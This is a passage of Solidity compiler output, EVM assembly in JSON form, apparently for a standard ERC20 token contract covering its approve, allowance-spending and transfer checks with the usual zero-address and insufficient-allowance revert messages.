											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 10550,
											"end": 10618,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10550,
											"end": 10618,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3576,
											"end": 3578,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 10550,
											"end": 10618,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 10550,
											"end": 10618,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 10550,
											"end": 10618,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3558,
											"end": 3579,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 3615,
											"end": 3617,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 3595,
											"end": 3613,
											"name": "DUP1",
											"source": 5
										},
										{
											"begin": 3595,
											"end": 3613,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 3595,
											"end": 3613,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 3588,
											"end": 3618,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 3654,
											"end": 3688,
											"name": "PUSH",
											"source": 5,
											"value": "45524332303A20617070726F76652066726F6D20746865207A65726F20616464"
										},
										{
											"begin": 3634,
											"end": 3652,
											"name": "PUSH",
											"source": 5,
											"value": "44"
										},
										{
											"begin": 3634,
											"end": 3652,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 3634,
											"end": 3652,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 3627,
											"end": 3689,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "72657373"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 3705,
											"end": 3723,
											"name": "PUSH",
											"source": 5,
											"value": "64"
										},
										{
											"begin": 3705,
											"end": 3723,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 3705,
											"end": 3723,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 3698,
											"end": 3732,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 3749,
											"end": 3768,
											"name": "PUSH",
											"source": 5,
											"value": "84"
										},
										{
											"begin": 3749,
											"end": 3768,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 10550,
											"end": 10618,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 3374,
											"end": 3774,
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 10550,
											"end": 10618,
											"name": "tag",
											"source": 0,
											"value": "109"
										},
										{
											"begin": 10550,
											"end": 10618,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 10636,
											"end": 10657,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 10636,
											"end": 10657,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 10628,
											"end": 10696,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "112"
										},
										{
											"begin": 10628,
											"end": 10696,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10628,
											"end": 10696,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10628,
											"end": 10696,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 10628,
											"end": 10696,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10628,
											"end": 10696,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3981,
											"end": 3983,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 10628,
											"end": 10696,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 10628,
											"end": 10696,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 10628,
											"end": 10696,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3963,
											"end": 3984,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 4020,
											"end": 4022,
											"name": "PUSH",
											"source": 5,
											"value": "22"
										},
										{
											"begin": 4000,
											"end": 4018,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 4000,
											"end": 4018,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 4000,
											"end": 4018,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 3993,
											"end": 4023,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 4059,
											"end": 4093,
											"name": "PUSH",
											"source": 5,
											"value": "45524332303A20617070726F766520746F20746865207A65726F206164647265"
										},
										{
											"begin": 4039,
											"end": 4057,
											"name": "PUSH",
											"source": 5,
											"value": "44"
										},
										{
											"begin": 4039,
											"end": 4057,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 4039,
											"end": 4057,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 4032,
											"end": 4094,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "7373"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "F0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 4110,
											"end": 4128,
											"name": "PUSH",
											"source": 5,
											"value": "64"
										},
										{
											"begin": 4110,
											"end": 4128,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 4110,
											"end": 4128,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 4103,
											"end": 4135,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 4152,
											"end": 4171,
											"name": "PUSH",
											"source": 5,
											"value": "84"
										},
										{
											"begin": 4152,
											"end": 4171,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 10628,
											"end": 10696,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 3779,
											"end": 4177,
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 10628,
											"end": 10696,
											"name": "tag",
											"source": 0,
											"value": "112"
										},
										{
											"begin": 10628,
											"end": 10696,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 10707,
											"end": 10725,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10725,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10725,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10725,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 10707,
											"end": 10725,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10725,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10725,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10718,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 10707,
											"end": 10725,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 10707,
											"end": 10725,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10725,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10725,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10725,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10707,
											"end": 10725,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10725,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10725,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10734,
											"name": "SWAP5",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10734,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10734,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10734,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10734,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10734,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10734,
											"name": "SWAP5",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10734,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10734,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10734,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10734,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10734,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10734,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10743,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10743,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10707,
											"end": 10743,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 10758,
											"end": 10790,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10758,
											"end": 10790,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1342,
											"end": 1367,
											"name": "DUP5",
											"source": 5
										},
										{
											"begin": 1342,
											"end": 1367,
											"name": "DUP2",
											"source": 5
										},
										{
											"begin": 1342,
											"end": 1367,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 10758,
											"end": 10790,
											"name": "PUSH",
											"source": 0,
											"value": "8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925"
										},
										{
											"begin": 10758,
											"end": 10790,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1315,
											"end": 1333,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 10758,
											"end": 10790,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10758,
											"end": 10790,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 10758,
											"end": 10790,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10758,
											"end": 10790,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 10758,
											"end": 10790,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 10758,
											"end": 10790,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10758,
											"end": 10790,
											"name": "LOG3",
											"source": 0
										},
										{
											"begin": 10457,
											"end": 10797,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10457,
											"end": 10797,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10457,
											"end": 10797,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10457,
											"end": 10797,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 11078,
											"end": 11489,
											"name": "tag",
											"source": 0,
											"value": "79"
										},
										{
											"begin": 11078,
											"end": 11489,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 11178,
											"end": 11202,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 11205,
											"end": 11230,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "117"
										},
										{
											"begin": 11215,
											"end": 11220,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 11222,
											"end": 11229,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 11205,
											"end": 11214,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "61"
										},
										{
											"begin": 11205,
											"end": 11230,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 11205,
											"end": 11230,
											"name": "tag",
											"source": 0,
											"value": "117"
										},
										{
											"begin": 11205,
											"end": 11230,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 11178,
											"end": 11230,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 11178,
											"end": 11230,
											"name": "POP",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 11244,
											"end": 11260,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 11244,
											"end": 11281,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 11240,
											"end": 11483,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "122"
										},
										{
											"begin": 11240,
											"end": 11483,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 11325,
											"end": 11331,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 11305,
											"end": 11321,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 11305,
											"end": 11331,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 11305,
											"end": 11331,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 11297,
											"end": 11365,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "119"
										},
										{
											"begin": 11297,
											"end": 11365,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 11297,
											"end": 11365,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 11297,
											"end": 11365,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 11297,
											"end": 11365,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 11297,
											"end": 11365,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 4384,
											"end": 4386,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 11297,
											"end": 11365,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 11297,
											"end": 11365,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 11297,
											"end": 11365,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 4366,
											"end": 4387,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 4423,
											"end": 4425,
											"name": "PUSH",
											"source": 5,
											"value": "1D"
										},
										{
											"begin": 4403,
											"end": 4421,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 4403,
											"end": 4421,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 4403,
											"end": 4421,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 4396,
											"end": 4426,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 4462,
											"end": 4493,
											"name": "PUSH",
											"source": 5,
											"value": "45524332303A20696E73756666696369656E7420616C6C6F77616E6365000000"
										},
										{
											"begin": 4442,
											"end": 4460,
											"name": "PUSH",
											"source": 5,
											"value": "44"
										},
										{
											"begin": 4442,
											"end": 4460,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 4442,
											"end": 4460,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 4435,
											"end": 4494,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 4511,
											"end": 4529,
											"name": "PUSH",
											"source": 5,
											"value": "64"
										},
										{
											"begin": 4511,
											"end": 4529,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 11297,
											"end": 11365,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 4182,
											"end": 4535,
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 11297,
											"end": 11365,
											"name": "tag",
											"source": 0,
											"value": "119"
										},
										{
											"begin": 11297,
											"end": 11365,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 11407,
											"end": 11458,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "122"
										},
										{
											"begin": 11416,
											"end": 11421,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 11423,
											"end": 11430,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 11451,
											"end": 11457,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 11432,
											"end": 11448,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 11432,
											"end": 11457,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 11407,
											"end": 11415,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "74"
										},
										{
											"begin": 11407,
											"end": 11458,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 11407,
											"end": 11458,
											"name": "tag",
											"source": 0,
											"value": "122"
										},
										{
											"begin": 11407,
											"end": 11458,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 11168,
											"end": 11489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 11078,
											"end": 11489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 11078,
											"end": 11489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 11078,
											"end": 11489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 11078,
											"end": 11489,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 7456,
											"end": 8244,
											"name": "tag",
											"source": 0,
											"value": "81"
										},
										{
											"begin": 7456,
											"end": 8244,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 7552,
											"end": 7570,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 7552,
											"end": 7570,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 7544,
											"end": 7612,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "124"
										},
										{
											"begin": 7544,
											"end": 7612,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 7544,
											"end": 7612,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 7544,
											"end": 7612,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 7544,
											"end": 7612,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 7544,
											"end": 7612,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 4742,
											"end": 4744,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 7544,
											"end": 7612,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 7544,
											"end": 7612,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 7544,
											"end": 7612,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 4724,
											"end": 4745,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 4781,
											"end": 4783,
											"name": "PUSH",
											"source": 5,
											"value": "25"
										},
										{
											"begin": 4761,
											"end": 4779,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 4761,
											"end": 4779,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 4761,
											"end": 4779,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 4754,
											"end": 4784,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 4820,
											"end": 4854,
											"name": "PUSH",
											"source": 5,
											"value": "45524332303A207472616E736665722066726F6D20746865207A65726F206164"
										},
										{
											"begin": 4800,
											"end": 4818,
											"name": "PUSH",
											"source": 5,
											"value": "44"
										},
										{
											"begin": 4800,
											"end": 4818,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 4800,
											"end": 4818,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 4793,
											"end": 4855,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "6472657373"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "D8"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 4871,
											"end": 4889,
											"name": "PUSH",
											"source": 5,
											"value": "64"
										},
										{
											"begin": 4871,
											"end": 4889,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 4871,
											"end": 4889,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 4864,
											"end": 4899,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 4916,
											"end": 4935,
											"name": "PUSH",
											"source": 5,
											"value": "84"
										},
										{
											"begin": 4916,
											"end": 4935,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 7544,
											"end": 7612,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 4540,
											"end": 4941,
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 7544,
											"end": 7612,
											"name": "tag",
											"source": 0,
											"value": "124"
										},
										{
											"begin": 7544,
											"end": 7612,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 7630,
											"end": 7646,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 7630,
											"end": 7646,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 7622,
											"end": 7686,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "127"
										},
										{
											"begin": 7622,
											"end": 7686,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 7622,
											"end": 7686,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 7622,
											"end": 7686,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 7622,
											"end": 7686,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 7622,
											"end": 7686,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 5148,
											"end": 5150,
											"name": "PUSH",
											"source": 5,
											"value": "20"
										},
										{
											"begin": 7622,
											"end": 7686,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 7622,
											"end": 7686,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 7622,
											"end": 7686,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5130,
											"end": 5151,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 5187,
											"end": 5189,
											"name": "PUSH",
											"source": 5,
											"value": "23"
										},
										{
											"begin": 5167,
											"end": 5185,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 5167,
											"end": 5185,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 5167,
											"end": 5185,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 5160,
											"end": 5190,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 5226,
											"end": 5260,
											"name": "PUSH",
											"source": 5,
											"value": "45524332303A207472616E7366657220746F20746865207A65726F2061646472"
										},
										{
											"begin": 5206,
											"end": 5224,
											"name": "PUSH",
											"source": 5,
											"value": "44"
										},
										{
											"begin": 5206,
											"end": 5224,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 5206,
											"end": 5224,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 5199,
											"end": 5261,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "657373"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E8"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 5277,
											"end": 5295,
											"name": "PUSH",
											"source": 5,
											"value": "64"
										},
										{
											"begin": 5277,
											"end": 5295,
											"name": "DUP3",
											"source": 5
										},
										{
											"begin": 5277,
											"end": 5295,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 5270,
											"end": 5303,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": 5320,
											"end": 5339,
											"name": "PUSH",
											"source": 5,
											"value": "84"
										},
										{
											"begin": 5320,
											"end": 5339,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 7622,
											"end": 7686,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 4946,
											"end": 5345,
											"name": "JUMP",
											"source": 5
										},
										{
											"begin": 7622,
											"end": 7686,
											"name": "tag",
											"source": 0,
											"value": "127"
										},
										{
											"begin": 7622,
											"end": 7686,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 7768,
											"end": 7783,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 7768,
											"end": 7783,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 7746,
											"end": 7765,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 7768,
											"end": 7783,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7768,
											"end": 7783,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 7768,
											"end": 7783,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 7768,
											"end": 7783,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 7768,
											"end": 7783,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 7768,
											"end": 7783,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7768,
											"end": 7783,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 7768,
											"end": 7783,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 7768,
											"end": 7783,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 7768,
											"end": 7783,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 7768,
											"end": 7783,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 7801,
											"end": 7822,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 7801,
											"end": 7822,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 7801,
											"end": 7822,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 7801,
											"end": 7822,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 7793,
											"end": 7865,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "132"
										},
										{
											"begin": 7793,
											"end": 7865,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 7793,
											"end": 7865,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 7793,
											"end": 7865,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 7793,
											"end": 7865,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 7793,
											"end": 7865,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 5552,
											"end": 5554,
